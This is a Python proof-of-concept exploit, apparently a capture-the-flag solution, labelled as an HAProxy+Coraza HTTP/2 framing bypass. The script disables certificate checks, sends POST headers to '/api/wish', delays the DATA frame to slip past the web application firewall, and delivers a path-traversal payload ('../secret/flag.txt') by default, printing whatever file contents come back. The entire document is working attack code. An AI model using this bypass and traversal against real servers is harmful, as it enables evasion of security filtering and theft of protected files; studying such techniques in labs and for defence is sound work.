#!/usr/bin/env python3
import argparse
import json
import socket
import ssl
import time

import h2.connection
import h2.events


def run(host: str, port: int, delay: float, payload: str) -> None:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    # Ask for h2, but the core bypass is delayed DATA frame delivery.
    ctx.set_alpn_protocols(["h2", "http/1.1"])

    sock = socket.create_connection((host, port), timeout=5)
    tls_sock = ctx.wrap_socket(sock, server_hostname=host)

    conn = h2.connection.H2Connection()
    conn.initiate_connection()
    tls_sock.sendall(conn.data_to_send())

    body = payload.encode()
    stream_id = conn.get_next_available_stream_id()
    headers = [
        (":method", "POST"),
        (":authority", f"{host}:{port}"),
        (":scheme", "https"),
        (":path", "/api/wish"),
        ("content-type", "application/x-www-form-urlencoded"),
        ("content-length", str(len(body))),
    ]

    conn.send_headers(stream_id=stream_id, headers=headers, end_stream=False)
    tls_sock.sendall(conn.data_to_send())
    print(f"[+] HEADERS sent, waiting {delay:.2f}s before DATA...")
    time.sleep(delay)

    conn.send_data(stream_id=stream_id, data=body, end_stream=True)
    tls_sock.sendall(conn.data_to_send())
    print("[+] DATA sent")

    response_headers = []
    response_body = b""

    while True:
        incoming = tls_sock.recv(65535)
        if not incoming:
            break

        events = conn.receive_data(incoming)
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                response_headers.extend(event.headers)
            elif isinstance(event, h2.events.DataReceived):
                response_body += event.data
                conn.acknowledge_received_data(event.flow_controlled_length, stream_id)
            elif isinstance(event, h2.events.StreamEnded):
                normalized = {}
                for key, value in response_headers:
                    if isinstance(key, bytes):
                        key = key.decode(errors="replace")
                    if isinstance(value, bytes):
                        value = value.decode(errors="replace")
                    normalized[key] = value
                status = normalized.get(":status", "unknown")
                print(f"[+] Response status: {status}")
                body_text = response_body.decode(errors="replace")
                print("[+] Response body:")
                print(body_text)
                try:
                    parsed = json.loads(body_text)
                    content = parsed.get("content")
                    if content:
                        print("[+] Extracted content:")
                        print(content.rstrip())
                except json.JSONDecodeError:
                    pass
                tls_sock.close()
                return

        outbound = conn.data_to_send()
        if outbound:
            tls_sock.sendall(outbound)

    tls_sock.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="HAProxy+Coraza H2 framing bypass PoC")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--delay", type=float, default=0.7)
    parser.add_argument(
        "--payload",
        default="../secret/flag.txt",
        help="Raw request body; for traversal use ../secret/flag.txt",
    )
    args = parser.parse_args()
    run(args.host, args.port, args.delay, args.payload)


if __name__ == "__main__":
    main()
